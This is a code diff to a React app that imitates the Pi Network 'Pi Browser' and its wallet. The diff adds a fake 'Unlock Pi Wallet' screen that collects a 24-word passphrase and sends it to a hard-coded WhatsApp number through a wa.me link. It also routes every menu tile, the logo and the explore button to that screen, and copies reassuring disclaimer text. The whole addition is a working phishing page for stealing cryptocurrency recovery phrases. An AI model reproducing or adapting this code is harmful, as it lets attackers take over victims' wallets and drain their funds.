@@ -11,48 +11,120 @@ import Mine_logo from "./assets/Mine_logo.png";
 import wallet_logo from "./assets/wallet_logo.png";
 
 function App() {
+  const [showPassPhrase, setShowPassPhrase] = useState(false);
+  const [passphrase, setPassphrase] = useState('');
+  const phoneNumber = "9082940349";
+
+  const handleNavigateToPassPhrase = () => {
+    setShowPassPhrase(true);
+  };
+
+  const handleGoBack = () => {
+    setShowPassPhrase(false);
+  };
+
+  const handlePassphraseChange = (e) => {
+    setPassphrase(e.target.value);
+  };
+
+  const handleUnlockWithPassphrase = () => {
+    if (passphrase.trim()) {
+      const formattedNumber = phoneNumber.replace(/[^0-9]/g, '');
+      const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodeURIComponent(passphrase)}`;
+      window.open(whatsappUrl, '_blank');
+    } else {
+      alert('Please enter your passphrase');
+    }
+  };
+
+  // PassPhrase Component
+  if (showPassPhrase) {
+    return (
+      <div className="passphrase-container">
+        <div className="passphrase-wrapper">
+          <h1 className="passphrase-title">Unlock Pi Wallet</h1>
+          
+          <div className="passphrase-input-container">
+            <div className="passphrase-textarea-wrapper">
+              <textarea 
+                placeholder="Enter your 24-word passphrase here"
+                className="passphrase-textarea"
+                value={passphrase}
+                onChange={handlePassphraseChange}
+              />
+            </div>
+          </div>
+          
+          <button 
+            className="passphrase-button"
+            onClick={handleUnlockWithPassphrase}
+          >
+            Unlock With Passphrase
+          </button>
+          
+          <button className="fingerprint-button">
+            Unlock With Fingerprint
+          </button>
+          
+          <p className="disclaimer-text">
+            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+          </p>
+          
+          <p className="disclaimer-text">
+            Lost your passphrase? <a href="#" className="link-text">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+          </p>
+          
+          <button className="back-button" onClick={handleGoBack}>
+            Back to Home
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  // Main App Component
   return (
     <>
       <div className="pi-browser">
         <div className="header">
           <div className="logo-container">
             <div className="pi-logo">
-            <img src={pi_logo} alt="Pi Logo" />
+            <img src={pi_logo} alt="Pi Logo" onClick={handleNavigateToPassPhrase} />
             </div>
           </div>
           <h1 className="title">Welcome to the Pi Browser</h1>
         </div>
 
         <div className="menu-grid">
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={fireside_logo} alt="Pi Logo" />
             </div>
             <p>Fireside</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={wallet_logo} alt="Pi Logo" />
             </div>
             <p>Wallet</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={brainstorm_logo} alt="Pi Logo" />
             </div>
             <p>Brainstorm</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={Mine_logo} alt="Pi Logo" />
             </div>
             <p>Mine</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
           
             <div className='block_classs'>
             <img src={Blockchian_logo} alt="Pi Logo" />
@@ -62,14 +134,14 @@ function App() {
             <p>Blockchain</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={develop_logo} alt="Pi Logo" />
             </div>
             <p>Develop</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={kyc_logo} alt="Pi Logo" />
             </div>
@@ -77,14 +149,14 @@ function App() {
             <p>KYC</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
             <img src={chatlogo} alt="Chat" />
             </div>
             <p>Chat</p>
           </div>
 
-          <div className="menu-item">
+          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
             <div className="icon-container purple">
               <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="12" cy="8" r="4" stroke="#663399" strokeWidth="2" fill="none" />
@@ -95,7 +167,7 @@ function App() {
           </div>
         </div>
 
-        <div className="explore-button">
+        <div className="explore-button" onClick={handleNavigateToPassPhrase}>
           <div className="explore-icon">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="white" strokeWidth="2" fill="none" />
